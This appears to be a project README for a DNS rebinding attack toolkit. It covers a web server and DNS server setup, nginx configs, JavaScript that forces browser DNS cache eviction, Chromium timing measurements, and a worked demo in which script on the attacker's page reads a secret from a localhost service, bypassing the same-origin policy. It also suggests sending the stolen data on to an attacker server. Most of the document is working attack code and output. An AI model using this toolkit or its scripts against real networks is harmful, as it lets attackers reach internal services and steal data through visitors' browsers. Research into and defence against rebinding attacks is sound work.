Inspired by [@tavisio](https://bugs.chromium.org/p/project-zero/issues/detail?id=1471&desc=3)

This project is meant to be an All-in-one Toolkit to test further [DNS 
rebinding attacks](https://en.wikipedia.org/wiki/DNS_rebinding) and my take on understanding these kind of attacks. 
It consists of a web server and pseudo DNS server that  only responds to A queries.

The root index of the web server allowes to configure and run the attack with a
rudimentary web gui. See [dnsrebindtool.43z.one](http://dnsrebindtool.43z.one).

A basic nginx config to host the web server
```nginx
server {
  listen 80;
  server_name dnsrebindtool.43z.one;

  location / {
    proxy_pass http://localhost:5000;
  }
}
```

The /attack route of the web server reads the GET parameter `script`
that should provide basic64 encoded javascript and responds with the decoded code
(wraped around a setTimeout) embeded in a regular HTML page.

```bash
% curl "http://dnsrebindtool.43z.one/attack?script=YWxlcnQoMSk=" 
<html>
    <script>

    setTimeout(function(){
      alert(1) 
    }, 3000)

  </script>
</html
```

Within my registrar for the domain 43z.one I setup a NS record for the subdomain
`rebind` to point to the IP where this tool is hosted.
```
ns       A   81.4.124.10
rebind   NS  ns.43z.one
```

The DNS server responds only to A queries in this format

`evcmxfm4g . 81-4-124-10 . 127-0-0-1 .rebind.43z.one`

The first part (subdomain) is just some random id and should be generated for
every attack session (the web gui does this on every reload). Second comes the 
IP the DNS server should respond for the next 2 seconds and third the IP the 
server should respond after that time is passed.

```
$ date && nslookup -type=a evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one 
Fri Feb  2 21:18:20 CET 2018
Server:   8.8.8.8
Address:  8.8.8.8#53

Non-authoritative answer:
Name: evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one
Address: 81.4.124.10

$ date && nslookup -type=a evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one
Fri Feb  2 21:18:23 CET 2018
Server:   8.8.8.8
Address:  8.8.8.8#53

Non-authoritative answer:
Name: evcmxfm4b.81-4-124-10.127-0-0-1.rebind.43z.one
Address: 127.0.0.1
```
The last missing peace is a nginx config for the rebind domains.
Only the /attack route should be passed to the tool others should respond
with an error. This allows to attack other services on port 80 with all routes but
/attack. (like /api/monitoring/stats a endpoint my router exposes)

```
server {
  listen 80;
  server_name *.rebind.43z.one;

  location / {
    return 404;
  }

  location /attack {
    proxy_pass http://localhost:5000/attack;
  }
}
```

DNS Cache Eviction
```javascript
var xhr = new XMLHttpRequest()
xhr.open('GET', 'czg9g2olz.81-4-124-10.127-0-0-1.rebind.43z.one', false)
xhr.send()
// first time the browser sees this domain it queries the dns server
// and gets 81.4.124.10

// sleep for more than 2 sec

xhr.open('GET', 'czg9g2olz.81-4-124-10.127-0-0-1.rebind.43z.one', false)
xhr.send()
// still uses 81.4.124.10 (AND NOT 127.0.0.1)
// NO dns query happened browser used cached IP
```

This is a problem for this kind of attack. In order to work the browser has to
reissue a new dns query to get the second IP. In theory if you just wait long enough
between the requests a new query should happen.
My tests show though there is a faster but more aggressive approach.
It could be very likely this is setup specific. Needs more testing
I used the following script to measure the optimum value for the WAIT variable.
Tested on Chromium 62.0.3202.89 running on Debian buster/sid.

```javascript
var WAIT = 200
var start = Date.now()

var interval = setInterval(function(){
  var xhr = new XMLHttpRequest()
  xhr.open('GET', '//' + $REBIND_DOMAIN, false)

  xhr.send()

  if(xhr.status == 200){
    document.body.innerHTML = (Date.now() - start)/1000
    document.body.innerHTML += xhr.responseText
    clearInterval(interval)
    return
  }
}, WAIT)
```

| WAIT value in ms | requests chrome sends | Time until queries dns again |
| --- | --- | --- |
| 0  |700|60|
| 10 |700|60|
| 100|600|63|
| 120|500|63|
| 150|400|63|
| 180|400|75|
| 200|300|63|
| 220|300|69|
| 250|300|78|
| 280|300|87|
| 300|200|63|
| 320|200|67|
| 340|200|71|
| 360|200|75|
| 380|200|79|
| 400|200|83|
| 1000|100|103|

I started a new repo just to explore this [dns cache eviction tester](https://github.com/h43z/dns-cache-eviction)

Putting it all together and test it.
```bash
echo -e "HTTP/1.1 200 OK\n\n TOPSECRET" | sudo nc -lvp 80 -q1 127.0.0.1
```

This netcat instance serves some content I would like to get access to.
I keep the default rebind domain  
`$RANDOM$.81-4-124-10.127-0-0-1.rebind.43z.one`
and default script 

```javascript
var start = Date.now()

var interval = setInterval(function(){
  var xhr = new XMLHttpRequest()
  xhr.open('GET', '//' + $REBIND_DOMAIN, false)

  xhr.send()

  if(xhr.status == 200){
    document.body.innerHTML = (Date.now() - start)/1000
    document.body.innerHTML += xhr.responseText
    clearInterval(interval)
    return
  }
}, 200)

```
on [dnsrebindtool.43z.one](http://dnsrebindtool.43z.one) and hit the Attack button.
Open the dev tools network tab to see what is happening in the background.
For me after about 60 seconds fills up with the string `TOPSECRET` and the time
it took. DNS rebinding circumvented [SOP](https://en.wikipedia.org/wiki/Same-origin_policy).
To get the breached data out of the iframe one could use [Window.PostMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) or include code that forwards the data
to another attacker server within the script itself.
